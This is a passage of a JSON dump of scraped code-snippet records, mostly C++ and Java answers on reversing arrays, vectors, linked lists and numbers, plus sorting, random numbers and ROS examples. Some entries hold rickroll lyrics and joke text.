NULL;     struct node *prev = NULL;     struct node *current = (*head_ref);     while(current != NULL) {         temp = current->next;         current->next = prev;         prev = current;         current = temp;     }     (*head_ref) = prev; }   // To check our program  void printnodes(struct node *head) {     while(head != NULL) {         cout<<head->data<<\" \";         head = head->next;     } }   // Driver function int main() {     struct node *head = NULL;     push(&head, 0);     push(&head, 1);     push(&head, 8);     push(&head, 0);     push(&head, 4);     push(&head, 10);     cout << \"Linked List Before Reversing\" << endl;     printnodes(head);     reverse(&head);     cout << endl;     cout << \"Linked List After Reversing\"<<endl;     printnodes(head);     return 0; } \nvoid reverse(Node* head) {    // Initialize current, previous and     // next pointers     Node *current = head;     Node *prev = NULL, *next = NULL    while (current != NULL)     {        // Store next         next = current->next        // Reverse current node's pointer         current->next = prev        // Move pointers one position ahead.         prev = current        current = next    }    head = prev }\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3566,
    "keyword": null,
    "link": null,
    "title": " reverse a number using recursion in c++",
    "description": "#include <iostream> #include <math.h>   using namespace std;    //Fuction declaration int reverseNumber(int num);   int main() {     int num, reverse;       // Inputting number from user     cout<<\"Enter any number: \";     cin>>num;       // Calling function to reverse any number     reverse = reverseNumber(num);       cout<<\"Reverse of number \"<<num <<\" is: \"<<reverse;       return 0; }   //Recursive function to find reverse of any number   int reverseNumber(int num) {     // Find total digits in num     int digit = (int) log10(num);       // Base condition     if(num == 0)         return 0;       return ((num\u0010 * pow(10, digit)) + reverseNumber(num/10)); }\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3567,
    "keyword": null,
    "link": null,
    "title": " reverse a stack using recursion",
    "description": "#include <bits/stdc++.h>  using namespace std; void insert(stack<int>&s,int e) {     if(s.size()==0)     {         s.push(e);         return;     }     int temp=s.top();     s.pop();     insert(s,e);     s.push(temp); } void rever(stack<int>&s) {     if(s.size()==0)     {         return;     }     int temp=s.top();     s.pop();     rever(s);     insert(s,temp); } int main() {     int n;     cin>>n;     stack<int>st;     for(int i=0;i<n;i++)     {          int a;         cin>>a;         st.push(a);     }     rever(st);     while(!st.empty())     {         cout<<st.top()<<endl;         st.pop();     }     return 0; } \n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3568,
    "keyword": null,
    "link": null,
    "title": " reverse a vector",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n//vector<int> A; reverse(A.begin(),A.end());\n    std::vector<int> v{1,2,3};     std::reverse(std::begin(v), std::end(v));\nvector<int> a = {1,2,3,4,5,6}; reverse(a.begin(), a.end());\n// Given the vector vector<int> a = { 1, 45, 54, 71, 76, 12 };  // Reverse the vector reverse(a.begin(), a.end());\nreverse(start_index, last_index);\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3569,
    "keyword": null,
    "link": null,
    "title": " reverse a vector c++",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n#include <iostream> #include <vector> #include <algorithm> using namespace std; int main() {    vector<int> v = { 10, 9, 8, 6, 7, 2, 5, 1 };    sort(v.begin(), v.end(), greater <>()); }\n//vector<int> A; reverse(A.begin(),A.end());\n    std::vector<int> v{1,2,3};     std::reverse(std::begin(v), std::end(v));\nvector<int> a = {1,2,3,4,5,6}; reverse(a.begin(), a.end());\n// Given the vector vector<int> a = { 1, 45, 54, 71, 76, 12 };  // Reverse the vector reverse(a.begin(), a.end());\n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3570,
    "keyword": null,
    "link": null,
    "title": " reverse an array in c++",
    "description": "#include <iostream> using namespace std; int main() {\t\t// While loop \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t   \treturn 0; } \n#include <iostream> using namespace std; int main() { \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint end = SIZE - 1, temp; \tfor (int i = 0; i < end; i++) \t{ \t\ttemp = arr[i]; \t\tarr[i] = arr[end]; \t\tarr[end] = temp; \t\tend--; \t} \t/*\tReverse using while loop \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t}*/ \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t \t} \n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3571,
    "keyword": null,
    "link": null,
    "title": " reverse an array in c++ using while loop",
    "description": "#include <iostream> using namespace std; int main() { \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t \t} \n",
    "reg_date": "2021-10-12T11:43:07.000Z"
  },
  {
    "id": 3572,
    "keyword": null,
    "link": null,
    "title": " reverse an array in cpp",
    "description": " int main(){       \tint arr[5] = {1,3,2,4,5}; \tsort(arr, arr+5, greater<int>());    \t// arr == {5,4,3,2,1}   \treturn 0; } \n#include <iostream> using namespace std; int main() {\t\t// While loop \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t} \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t   \treturn 0; } \n#include <iostream> #include <algorithm> #include <vector> #include <iterator> using namespace std; int main() {     vector<int>a = {11,22,33,44,99,55};     reverse(a.begin(), a.end());     auto it = a.begin();     for(it= a.begin(); it!=a.end(); it++){         cout << *it << ' ';         } } \n#include <iostream> using namespace std; int main() { \tconst int SIZE = 9; \tint arr [SIZE]; \tcout << \"Enter numbers: \\n\"; \tfor (int i = 0; i < SIZE; i++) \t\tcin >> arr[i]; \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl; \tcout << \"Reversed Array:\\n\"; \tint end = SIZE - 1, temp; \tfor (int i = 0; i < end; i++) \t{ \t\ttemp = arr[i]; \t\tarr[i] = arr[end]; \t\tarr[end] = temp; \t\tend--; \t} \t/*\tReverse using while loop \tint temp, start = 0, end = SIZE-1; \twhile (start < end) \t{ \t\ttemp = arr[start]; \t\tarr[start] = arr[end]; \t\tarr[end] = temp; \t\tstart++; \t\tend--; \t}*/ \tfor (int i = 0; i < SIZE; i++) \t\tcout << arr[i] << \"\\t\"; \tcout << endl;\t \t} \n//java program to reverse array using for loop public class ReverseArrayDemo  {    public static void main(String[] args)     {       int[] arrNumbers = new int[]{2, 4, 6, 8, 10};         System.out.println(\"Given array: \");         for(int a = 0; a < arrNumbers.length; a++)       {          System.out.print(arrNumbers[a] + \" \");       }       System.out.println(\"Reverse array: \");       // looping array in reverse order       for(int a = arrNumbers.length - 1; a >= 0; a--)        {            System.out.print(arrNumbers[a] + \" \");         }    } }\n#include<iostream> using namespace std; int main() {         int n=3;      int arr[]={1,2,3,4};       while (n>=0)     {         cout<<arr[n];         n--;       }               return 0; }\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3573,
    "keyword": null,
    "link": null,
    "title": " reverse c++",
    "description": "#include <bits/stdc++.h> // Vector #include <algorithm>  // Reverse  using namespace std;  int main() {     vector<int> nums{4,1,2,1,2};      reverse(nums.begin(), nums.end());     return 0; } \n//vector<int> A; reverse(A.begin(),A.end());\n#include <iostream> #include <algorithm> #include <vector> #include <iterator> using namespace std; int main() {     vector<int>a = {11,22,33,44,99,55};     reverse(a.begin(), a.end());     auto it = a.begin();     for(it= a.begin(); it!=a.end(); it++){         cout << *it << ' ';         } } \n    std::vector<int> v{1,2,3};     std::reverse(std::begin(v), std::end(v));\nvector<int> a = {1,2,3,4,5,6}; reverse(a.begin(), a.end());\nreverse(str.begin(),str.end());\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3574,
    "keyword": null,
    "link": null,
    "title": " reverse in vector c++",
    "description": "reverse(start_index, last_index);\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3575,
    "keyword": null,
    "link": null,
    "title": " reverse iterator c++",
    "description": "// Using iterators for (auto it = s.crbegin() ; it != s.crend(); ++it) {   std::cout << *it; }  // Naive for (int i = s.size() - 1; i >= 0; i--) {   std::cout << s[i]; } \n// string::rbegin/rend #include <iostream> #include <string>  int main () {   std::string str (\"now step live...\");   for (std::string::reverse_iterator rit=str.rbegin(); rit!=str.rend(); ++rit)     std::cout << *rit;   return 0; }\n// A reverse_iterator example using vectors  #include <iostream> #include <vector>  int main() { \tstd::vector<int> vec = {1, 2, 3, 4, 5};   \tstd::vector<int>::reverse_iterator r_iter;        // rbegin() points to the end of the vector, and rend()     // points to the front. Use crbegin() and crend() for   \t// the const versions of these interators.     for (r_iter = vec.rbegin(); r_iter != vec.rend(); r_iter++) {         std::cout << *r_iter << std::endl;     }   \t   \treturn 0; }\n...evil pets won \n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3576,
    "keyword": null,
    "link": null,
    "title": " reverse linked list by k",
    "description": "//Iterative program in C++ to reverse a linked list in groups of k  //\t(just before end of 2nd iteration of outer loop) [ 1->2->3->4->5->NULL ] // 1 <- 2    3 <- 4  5 ->NULL   (k=2)    ^\t\t ^\t\t ^    |\t\t |\t\t | prev_tail temp_head walker  void reverse_by_k(Node **head,int k){     Node* temp_head = *head,*walker = *head,*prev_tail = NULL;     while(walker){         int i=0;         Node *temp = NULL,*prev = NULL;         //initialize temporary head to set previous tail later         temp_head = walker;                  //reverse group of k nodes         while(i<k && walker){             temp = walker->next;             walker->next = prev;             prev = walker;             walker = temp;             i++;         }                  if(prev_tail){             //previous tail has to point to temporary head of current group             prev_tail->next = prev;             prev_tail = temp_head;         } else{             prev_tail = *head;             *head = prev;         }     } }\nclass recursion {  \tstatic Node head; // head of list  \tstatic class Node {  \t\tint data;  \t\tNode next;  \t\tNode(int d)  \t\t{   data = d;  \t\t\tnext = null; \t} }  \tstatic Node reverse(Node head)  \t{  \t\tif (head == null || head.next == null)  \t\t\treturn head;  \t\t/* reverse the rest list and put the first element          at the end */ \t\tNode rest = reverse(head.next);  \t\thead.next.next = head;  \t\t/* tricky step -- see the diagram */     \thead.next = null;  \t\t/* fix the head pointer */ \t\treturn rest;  \t}  /* Function to print linked list */ \tstatic void print()  \t{  \t\tNode temp = head;  \t\twhile (temp != null) {  \t\t\tSystem.out.print(temp.data + \" \");  \t\t\ttemp = temp.next;  \t\t}  \t\tSystem.out.println();  \t}  \tstatic void push(int data)  \t{  \t\tNode temp = new Node(data);  \t\ttemp.next = head;  \t\thead = temp;  \t} /* Driver program to test above function*/ public static void main(String args[])  {  \t/* Start with the empty list */ \tpush(20);  \tpush(4);  \tpush(15);  \tpush(85);  \tSystem.out.println(\"Given linked list\");  \tprint();  \thead = reverse(head);  \tSystem.out.println(\"Reversed Linked list\");  \tprint();  } } // This code is contributed by Prakhar Agarwal \nCollections.reverse(list); \nvoid reverse(Node* head) {    // Initialize current, previous and     // next pointers     Node *current = head;     Node *prev = NULL, *next = NULL    while (current != NULL)     {        // Store next         next = current->next        // Reverse current node's pointer         current->next = prev        // Move pointers one position ahead.         prev = current        current = next    }    head = prev }\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3577,
    "keyword": null,
    "link": null,
    "title": " reverse sort cpp",
    "description": " int main(){       \tint arr[5] = {1,3,2,4,5}; \tsort(arr, arr+5, greater<int>());    \t// arr == {5,4,3,2,1}   \treturn 0; } \n// C++ program to demonstrate default behaviour of  // sort() in STL.  #include <bits/stdc++.h>  using namespace std;     int main()  {      int arr[] = {1, 5, 8, 9, 6, 7, 3, 4, 2, 0};      int n = sizeof(arr)/sizeof(arr[0]);         sort(arr, arr+n);         cout << \"\\nArray after sorting using \"          \"default sort is : \\n\";      for (int i = 0; i < n; ++i)          cout << arr[i] << \" \";         return 0;  } \n#include <bits/stdc++.h>  using namespace std;   #define size(arr) sizeof(arr)/sizeof(arr[0]);   int main(){      int a[5] = {5, 2, 6,3 ,5};     int n = size(a);     sort((a), a + n);     for(int i = 0; i < n; i++){         cout << a[i];     }       return 0;  }\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3578,
    "keyword": null,
    "link": null,
    "title": " reverse string efficient in cpp without using function",
    "description": "#include <iostream> using namespace std; int main() {     char str[] = \"Reverseme\";     char reverse[50];     int i=-1;     int j=0;          /*Count the length, until it each at the end of string.*/            while(str[++i]!='\\0');            while(i>=0)                     reverse[j++]=str[--i];             reverse[j]='\\0';       cout<<\"Reverse of  a string is\"<< reverse;       return 0; }\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3579,
    "keyword": null,
    "link": null,
    "title": " reversing numbers in C++",
    "description": "#include <iostream> #include <string>  using namespace std;  int reverse(int number); // reverses the number's digits  int main() {  \tint x = 18475;  \tcout << \"18475 reversed is \" << reverse(18475) << endl; }  int reverse(int number) {  \tint result = 0;  \twhile (number > 0) { \t\tresult = result * 10 + number % 10; \t\tnumber /= 10; \t}  \treturn result; \t }\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3580,
    "keyword": null,
    "link": null,
    "title": " rgb(100,100,100,0.5) validation c++",
    "description": "#[a-zA-Z0-9]{6}|rgb\\((?:\\s*\\d+\\s*,){2}\\s*[\\d]+\\)|rgba\\((\\s*\\d+\\s*,){3}[\\d\\.]+\\)|hsl\\(\\s*\\d+\\s*(\\s*\\,\\s*\\d+\\%){2}\\)|hsla\\(\\s*\\d+(\\s*,\\s*\\d+\\s*\\%){2}\\s*\\,\\s*[\\d\\.]+\\)\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3581,
    "keyword": null,
    "link": null,
    "title": " rgb type def",
    "description": "  typedef struct Couleur_  { int rouge;    int vert;    int bleu;  }  Couleur;\n",
    "reg_date": "2021-10-12T11:43:08.000Z"
  },
  {
    "id": 3582,
    "keyword": null,
    "link": null,
    "title": " rhombus pattern in c++",
    "description": "#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n; \tfor(int i=n;i>=1;i--) \t{ \t\tfor(int j=1;j<=i;j++){ \t\t\tcout<<\"*\"; \t\t} \t\tcout<<endl; \t} \treturn 0; }\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3583,
    "keyword": null,
    "link": null,
    "title": " rick astley - never gonna give you up",
    "description": "never gonna let you down\n// https://www.youtube.com/watch?v=dQw4w9WgXcQ\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3584,
    "keyword": null,
    "link": null,
    "title": " rick roll",
    "description": "We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye\n# get rickroll'd XD\n// do you really need code for this?\nnever gonna give you up...never gonna let you down...\nYOUR MOM \ni did the biggest rick roll today, good luck!\nSo you've been auto-rickrolled ?\nnever gonna give you up\nprint(\"Never gonna give you up\")\nWe&prime;re no strangers to love You know the rules and so do I A full commitment's what I&prime;m thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you   We&prime;ve known each other for so long Your heart&prime;s been aching but You're too shy to say it Inside we both know what&prime;s been going on We know the game and we're gonna play it And if you ask me how I&prime;m feeling Don't tell me you&prime;re too blind to see  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you   (Ooh, give you up) (Ooh, give you up) (Ooh) Never gonna give, never gonna give (Give you up) (Ooh) Never gonna give, never gonna give (Give you up)  We've know each other for so long Your heart's been aching but You&prime;re too shy to say it Inside we both know what&prime;s been going on We know the game and we're gonna play it  I just wanna tell you how I&prime;m feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3585,
    "keyword": null,
    "link": null,
    "title": " rickroll",
    "description": "Link of the original clip : https://www.youtube.com/watch?v=dQw4w9WgXcQ  Link of rickroll if someone memorized the original one : https://www.youtube.com/watch?v=ub82Xb1C8os  Best link to rickroll without predicting it : https://www.youtube.com/watch?v=j5a0jTc9S10&list=PL3KnTfyhrIlcudeMemKd6rZFGDWyK23vx&index=9  Name of the song : Never Gonna Give You Up  Lyrics : We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you No, I'm never gonna give you up No, I'm never gonna let you down No, I'll never run around and hurt you Never, ever desert you We've known each other for so long Your heart's been aching but Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you No, I'm never gonna give you up No, I'm never gonna let you down No, I'll never run around and hurt you I'll never, ever desert you\nWe're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye\nBest song\n// do you really need code for this?\nRickrolling, alternatively rick-rolling or Rickroll, is a prank. It's an internet meme involving an unexpected appearance of the music video for the 1987 Rick Astley song \"Never Gonna Give You Up\".  The meme is a type of bait and switch using a disguised hyperlink that leads to the music video.\nur momroll\nWelp                                We're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it And if you ask me how I'm feeling Don't tell me you're too blind to see Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give, never gonna give (Give you up) (Ooh) Never gonna give, never gonna give (Give you up) We've known each other for so long Your heart's been aching but you're too shy to say it Inside we both know what's been going on We know the game and we're gonna play it I just wanna tell you how I'm feeling Gotta make you understand Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry\nWe're no strangers to love You know the rules and so do I A full commitment's what I'm thinking of You wouldn't get this from any other guy  I just wanna tell you how I'm feeling Gotta make you understand  Never gonna give you up Never gonna let you down Never gonna run around and desert you Never gonna make you cry Never gonna say goodbye Never gonna tell a lie and hurt you\nprint(\"Never gonna give you up\")\nClick me ! : https://www.youtube.com/watch?v=dQw4w9WgXcQ\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3586,
    "keyword": null,
    "link": null,
    "title": " right side pattern triangle   c++",
    "description": "output-        *      **     ***    ****   *****\n#include<bits/stdc++.h> using namespace std; int main() { \tint n; \tcin>>n;\t \tfor(int i=1;i<=n;i++){ \t\tfor(int j=1;j<=n;j++){ \t\t\tif(j<=n-i) \t\t\t{ \t\t\t\tcout<<\" \"; \t\t\t}else{ \t\t\t\tcout<<\"*\"; \t\t\t} \t\t\t \t\t}cout<<endl; \t} }\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3587,
    "keyword": null,
    "link": null,
    "title": " rng c++",
    "description": "#include <random> // std::uniform_int_distribution and std::mt19937 #include <ctime> //time for seed #include <iostream> // as stroustrup says in a tour of c++ \"dont use rand()\" its limited // mt19937 is way better int main(){   //this one makes the range, yes its a little ugly   std::uniform_int_distribution<int> range(1, 11);       // this one is the engine with seed of time, (why the hell mt19937!!!)   std::mt19937 generator(time(nullptr));    for(int i = 0; i < 5; ++i){     //we combine them and baaaam, there we go     std::cout << range(generator) << \" \";   }   return 0; }\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3588,
    "keyword": null,
    "link": null,
    "title": " rng cpp",
    "description": "// Add thus to with the headers mt19937 rng(chrono::steady_clock::now().time_since_epoch().count()); // Generate a function that will give values between l and r inclusive auto dist = uniform_int_distribution<int>(l, r); // get the random number using dist(rng);\n#include <stdio.h> #include <stdlib.h> #include <ctime>  int main() {   srand((unsigned) time(0));     printf(\"Your dice has been rolled! You got: \\n \");     int result = 1 + (rand() % 6);     printf(\"%d \\n\", result);    switch (result) {     case 1:         printf(\"Your prize is our original T-shirt!\");         break;     case 2:         printf(\"Your prize is our original cap!\");         break;     case 3:         printf(\"Your prize is our original necklace!\");         break;     case 4:         printf(\"Your prize is our original keychain!\");         break;     case 5:         printf(\"Your prize is our original cup set!\");         break;     case 6:         printf(\"Your prize is a set of original keychains!\");         break;     default:         printf(\"Error\");         break;     } }\n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3589,
    "keyword": null,
    "link": null,
    "title": " road repair hackerrank problem solving solution github",
    "description": "#include <algorithm> #include <cstdio> #include <deque> #include <utility> #include <vector> using namespace std;  typedef pair<int, int> pii; #define REP(i, n) for (int i = 0; i < (n); i++) #define fi first #define mp make_pair #define pb push_back #define se second  int ri() {   int x;   scanf(\"%d\", &x);   return x; }  const int N = 100000; vector<int> e[N];  // {C, {A, B}} // C: whether A covers the parent edge // A: cost of subtree(v) // B: cost of subtree(v)+parent edge; parent edge is the end of some path // A <= B <= A+1 pair<bool, pii> dfs(int v, int p) {   deque<pii> c;   int t = -1;   bool has = false;   for (auto u: e[v])     if (u != p) {       auto r = dfs(u, v);       if (! r.fi)         has = true;       if (r.se.fi == r.se.se)         c.push_front(r.se);       else         c.pb(r.se);       t = u;     }   if (c.empty())     return {false, pii{0, 1}};   bool cover = false;   int f = 0, g = 0, i = 0;   for (; i+1 < c.size() && c[i+1].fi == c[i+1].se; i += 2) // beneficial to pair B if the A=B for some child     f += c[i].se+c[i+1].se-1, cover = true;   if (i < c.size()) {     g = f+c[i].se;     if (c[i].fi == c[i].se)       cover = true;     // if A < B for all children and some child is uncovered     f += ! cover && has ? cover = true, c[i].se : c[i].fi;     while (++i < c.size())       f += c[i].fi, g += c[i].fi;   } else     g = f+1; // all children are paired, one more edge is needed to cover the parent edge   return {cover, {f, g}}; }  int main() {   for (int cc = ri(); cc--; ) {     int n = ri();     REP(i, n)       e[i].clear();     REP(i, n-1) {       int u = ri(), v = ri();       e[u].pb(v);       e[v].pb(u);     }     printf(\"%d\\n\", dfs(0, -1).se.fi);   } } \n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3590,
    "keyword": null,
    "link": null,
    "title": " rod cutting problem",
    "description": "//Rod cutting problem (Maximize the value) #include<bits/stdc++.h> using namespace std; int max_val(int arr[],int len) {     int t[len+1]={0};     for(int i=0;i<=len;i++)     {         for(int j=1;j<=i;j++)         {             t[i]=max(t[i],arr[j-1]+t[i-j]);         }     }     return t[len]; } int main() {     int n;     cin>>n;     int value[n];     for(int i=0;i<n;i++)     {         cin>>value[i];     }     int max_len;     cin>>max_len;     cout<<max_val(value,max_len);     return 0; } \n",
    "reg_date": "2021-10-12T11:43:09.000Z"
  },
  {
    "id": 3591,
    "keyword": null,
    "link": null,
    "title": " roscpp publish int32",
    "description": "#include <std_msgs/Int8.h>  std_msgs::Int8 msg; msg.data = 17; ROS_INFO(\"%d\", msg.data); chatter_pub.publish(msg);\n",
    "reg_date": "2021-10-12T11:43:10.000Z"
  },
  {
    "id": 3592,
    "keyword": null,
    "link": null,
    "title": " rosrun actionlib msgs genaction.py",
    "description": "   1 #include <ros/ros.h>    2 #include <actionlib/server/simple_action_server.h>    3 #include <learning_actionlib/FibonacciAction.h>    4     5 class FibonacciAction    6 {    7 protected:    8     9   ros::NodeHandle nh_;   10   actionlib::SimpleActionServer<learning_actionlib::FibonacciAction> as_; // NodeHandle instance must be created before this line. Otherwise strange error occurs.   11   std::string action_name_;   12   // create messages that are used to published feedback/result   13   learning_actionlib::FibonacciFeedback feedback_;   14   learning_actionlib::FibonacciResult result_;   15    16 public:   17    18   FibonacciAction(std::string name) :   19     as_(nh_, name, boost::bind(&FibonacciAction::executeCB, this, _1), false),   20     action_name_(name)   21   {   22     as_.start();   23   }   24    25   ~FibonacciAction(void)   26   {   27   }   28    29   void executeCB(const learning_actionlib::FibonacciGoalConstPtr &goal)   30   {   31     // helper variables   32     ros::Rate r(1);   33     bool success = true;   34    35     // push_back the seeds for the fibonacci sequence   36     feedback_.sequence.clear();   37     feedback_.sequence.push_back(0);   38     feedback_.sequence.push_back(1);   39    40     // publish info to the console for the user   41     ROS_INFO(\"%s: Executing, creating fibonacci sequence of order %i with seeds %i, %i\", action_name_.c_str(), goal->order, feedback_.sequence[0], feedback_.sequence[1]);   42    43     // start executing the action   44     for(int i=1; i<=goal->order; i++)   45     {   46       // check that preempt has not been requested by the client   47       if (as_.isPreemptRequested() || 